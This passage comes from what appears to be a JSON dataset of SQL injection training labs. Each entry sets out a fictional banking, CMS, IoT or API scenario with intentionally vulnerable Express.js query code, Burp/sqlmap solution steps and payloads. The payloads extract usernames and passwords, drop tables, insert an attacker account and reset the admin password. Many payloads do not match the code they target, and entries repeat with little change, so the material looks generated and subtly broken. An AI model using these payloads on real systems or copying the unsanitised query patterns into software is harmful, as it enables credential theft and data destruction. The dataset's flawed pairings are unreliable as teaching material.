      "SELECT * FROM users WHERE email = 'admin' UNION SELECT id, password FROM users--",
      "SELECT * FROM users WHERE email = 'user@example.com' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows filtering transactions by date but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'date_range' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const date_range = req.query.date_range;\n  const query = `SELECT * FROM transactions HAVING date_range = '${date_range}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in JOIN Clause",
    "Lab Description": "The IoT dashboard allows joining device information with user data but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to retrieve unauthorized user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the join device data endpoint.",
      "Inject SQL payloads into the 'join_condition' parameter, such as 'JOIN users ON devices.user_id = users.id UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/join-device', (req, res) => {\n  const join_condition = req.query.join_condition;\n  const query = `SELECT * FROM devices JOIN users ON ${join_condition}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON devices.user_id = users.id UNION SELECT username, password FROM users--",
      "JOIN employees ON devices.user_id = employees.id UNION SELECT id, password FROM users--",
      "JOIN accounts ON devices.user_id = accounts.id UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows querying articles by author but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article query endpoint.",
      "Inject SQL payloads into the 'author' parameter, such as '1' OR '1'='1' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-articles', (req, res) => {\n  const author = req.query.author;\n  const query = `SELECT * FROM articles WHERE author = '${author}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1 UNION SELECT username, password FROM users--",
      "admin OR 1=1 UNION SELECT id, password FROM users--",
      "' OR 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API Gateway allows ordering users by registration date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the user ordering endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/order-users', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM users ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT id, password FROM users--",
      "ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in UNION SELECT",
    "Lab Description": "The banking portal allows filtering user transactions but fails to sanitize input in the UNION SELECT clause. To solve: Exploit the UNION SELECT clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions WHERE type = '${transaction_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "UNION SELECT username, password FROM users--",
      "UNION SELECT id, password FROM users--",
      "UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS allows grouping articles by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article filtering endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Check for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles GROUP BY ${category}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT id, password FROM users--",
      "GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to query their transaction history by date, but the query is vulnerable in the WHERE clause. To solve: Exploit the WHERE clause to extract unauthorized information from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' OR '1'='1'.",
      "Observe for any unauthorized information leak from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM transactions WHERE transaction_date = '${date}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "2021-01-01' OR '1'='1'",
      "2021-01-01' OR '1'='1' UNION SELECT username, password FROM users--",
      "2021-01-01' OR '1'='1' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows admins to delete posts by post ID but fails to sanitize the input. To solve: Exploit the DELETE clause to remove posts or insert malicious data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete post endpoint.",
      "Inject SQL payloads into the 'post_id' parameter, such as '1; DELETE FROM posts WHERE post_id = 1--'.",
      "Check for successful post deletion or any anomalies in the database.",
      "Use sqlmap to automate the exploitation and test for additional vulnerabilities.",
      "Verify if the post was deleted or manipulated."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-post', (req, res) => {\n  const post_id = req.query.post_id;\n  const query = `DELETE FROM posts WHERE post_id = '${post_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Post deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM posts WHERE post_id = 1--",
      "1; DROP TABLE posts--",
      "1; INSERT INTO posts (title, content) VALUES ('Malicious Title', 'Malicious Content')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying user details by email but fails to sanitize the input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query user endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'example@domain.com' UNION SELECT username, password FROM users--.",
      "Observe the response for any unauthorized data leakage.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-user', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to group transactions by type but fails to sanitize the input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions GROUP BY ${transaction_type}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT id, password FROM users--",
      "GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting devices by name but fails to sanitize the input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device sorting endpoint.",
      "Inject SQL payloads into the 'sort_order' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-devices', (req, res) => {\n  const sort_order = req.query.sort_order;\n  const query = `SELECT * FROM devices ORDER BY ${sort_order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT id, password FROM users--",
      "ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS allows fetching articles with their associated authors but fails to sanitize the JOIN clause input. To solve: Exploit the JOIN clause to retrieve unauthorized user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article query endpoint.",
      "Inject SQL payloads into the 'join_condition' parameter, such as 'JOIN users ON articles.author_id = users.id UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/join-articles', (req, res) => {\n  const join_condition = req.query.join_condition;\n  const query = `SELECT * FROM articles JOIN users ON ${join_condition}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON articles.author_id = users.id UNION SELECT username, password FROM users--",
      "JOIN accounts ON articles.author_id = accounts.id UNION SELECT id, password FROM users--",
      "JOIN employees ON articles.author_id = employees.id UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway allows users to filter transactions by amount, but it fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve additional sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'amount' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const amount = req.query.amount;\n  const query = `SELECT * FROM transactions HAVING amount = '${amount}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows users to submit comments but fails to sanitize input during the INSERT operation. To solve: Exploit the INSERT clause to execute arbitrary SQL queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the comment submission endpoint.",
      "Inject SQL payloads into the 'comment' parameter, such as '1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--'.",
      "Check for successful comment submission and any changes in the database.",
      "Use sqlmap to automate the exploitation and test for additional vulnerabilities.",
      "Verify if the malicious SQL query was executed."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO comments (comment) VALUES ('${comment}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Comment submitted' });\n  });\n});",
    "payloads": [
      "1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--",
      "1); DROP TABLE comments--",
      "1); UPDATE users SET password='newpassword' WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIKE Clause",
    "Lab Description": "The banking portal allows users to search transactions by description but fails to sanitize input in the LIKE clause. To solve: Exploit the LIKE clause to retrieve unauthorized data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction search endpoint.",
      "Inject SQL payloads into the 'description' parameter, such as 'LIKE '%user%' UNION SELECT username, password FROM users--'.",
      "Observe the response for any unauthorized data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-transactions', (req, res) => {\n  const description = req.query.description;\n  const query = `SELECT * FROM transactions WHERE description LIKE '${description}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "LIKE '%user%' UNION SELECT username, password FROM users--",
      "LIKE '%admin%' UNION SELECT id, password FROM users--",
      "LIKE '%test%' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in AND Clause",
    "Lab Description": "The banking portal allows users to filter transactions by status, but the query is vulnerable in the AND clause. To solve: Exploit the AND clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active' AND '1'='1'.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT * FROM transactions WHERE status = '${status}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "active' AND '1'='1",
      "active' AND '1'='1' UNION SELECT username, password FROM users--",
      "active' AND '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UNION Clause",
    "Lab Description": "The CMS allows users to search posts by keyword, but the query is vulnerable in the UNION clause. To solve: Exploit the UNION clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the search posts endpoint.",
      "Inject SQL payloads into the 'keyword' parameter, such as 'test' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search-posts', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM posts WHERE title LIKE '%${keyword}%'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "The API Gateway allows users to filter products by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as 'Electronics' GROUP BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products GROUP BY ${category}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "Electronics' GROUP BY 1 UNION SELECT username, password FROM users--",
      "Electronics' GROUP BY 2 UNION SELECT id, password FROM users--",
      "Electronics' GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard allows users to view a list of devices with a limit on the number of devices shown, but the query is vulnerable in the LIMIT clause. To solve: Exploit the LIMIT clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the list devices endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '10' LIMIT 1,1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/list-devices', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "10' LIMIT 1,1 UNION SELECT username, password FROM users--",
      "10' LIMIT 1,1 UNION SELECT id, password FROM users--",
      "10' LIMIT 1,1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying users by email but fails to sanitize the input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query user endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'user@domain.com' UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-user', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users--",
      "' UNION SELECT id, password FROM users--",
      "' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS allows filtering articles by tag but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter articles endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'technology' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM articles HAVING tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "technology' HAVING 1=1 UNION SELECT username, password FROM users--",
      "technology' HAVING 1=1 UNION SELECT id, password FROM users--",
      "technology' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows users to sort devices by name, but the query is vulnerable in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the sort devices endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'name' ORDER BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-devices', (req, res) => {\n  const orderBy = req.query.order_by;\n  const query = `SELECT * FROM devices ORDER BY ${orderBy}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "name' ORDER BY 1 UNION SELECT username, password FROM users--",
      "name' ORDER BY 2 UNION SELECT id, password FROM users--",
      "name' ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to filter transactions by account number, but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as '12345' OR '1'='1'.",
      "Check for any unauthorized data leakage from the transactions table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const accountNumber = req.query.account_number;\n  const query = `SELECT * FROM transactions WHERE account_number = '${accountNumber}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "12345' OR '1'='1",
      "12345' OR '1'='1' UNION SELECT username, password FROM users--",
      "12345' OR '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway allows users to filter products by price range, but the query is vulnerable in the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the filter products endpoint.",
      "Inject SQL payloads into the 'price' parameter, such as '100' HAVING 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-products', (req, res) => {\n  const price = req.query.price;\n  const query = `SELECT * FROM products HAVING price = ${price}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "100' HAVING 1=1 UNION SELECT username, password FROM users--",
      "100' HAVING 1=1 UNION SELECT id, password FROM users--",
      "100' HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal allows users to filter account details by account number, but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter account details endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as '12345' OR '1'='1'.",
      "Check for any unauthorized data leakage from the accounts table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-details', (req, res) => {\n  const accountNumber = req.query.account_number;\n  const query = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "12345' OR '1'='1",
      "12345' OR '1'='1' UNION SELECT username, password FROM users--",
      "12345' OR '1'='1' UNION SELECT id, password FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in JOIN Clause",
    "Lab Description": "The API Gateway allows filtering users by role, but the query is vulnerable in the JOIN clause. To solve: Exploit the JOIN clause to retrieve unauthorized user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the filter users endpoint.",
      "Inject SQL payloads into the 'role' parameter, such as 'admin' JOIN users ON 1=1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-users', (req, res) => {\n  const role = req.query.role;\n  const query = `SELECT * FROM users JOIN roles ON users.role = roles.name WHERE role = '${role}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' JOIN users ON 1=1 UNION SELECT username, password FROM users--",
      "' JOIN users ON 1=1 UNION SELECT id, password FROM users--",
      "' JOIN users ON 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS allows users to sort articles by date, but the query is vulnerable in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the sort articles endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' ORDER BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-articles', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM articles ORDER BY ${date}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "2021-01-01' ORDER BY 1 UNION SELECT username, password FROM users--",
      "2021-01-01' ORDER BY 2 UNION SELECT id, password FROM users--",
      "2021-01-01' ORDER BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to filter transactions by month, but the query is vulnerable in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve unauthorized data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the filter transactions endpoint.",
      "Inject SQL payloads into the 'month' parameter, such as 'January' GROUP BY 1 UNION SELECT username, password FROM users--.",
      "Check for any unauthorized data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const month = req.query.month;\n  const query = `SELECT * FROM transactions GROUP BY ${month}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "January' GROUP BY 1 UNION SELECT username, password FROM users--",
      "January' GROUP BY 2 UNION SELECT id, password FROM users--",
      "January' GROUP BY 3 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
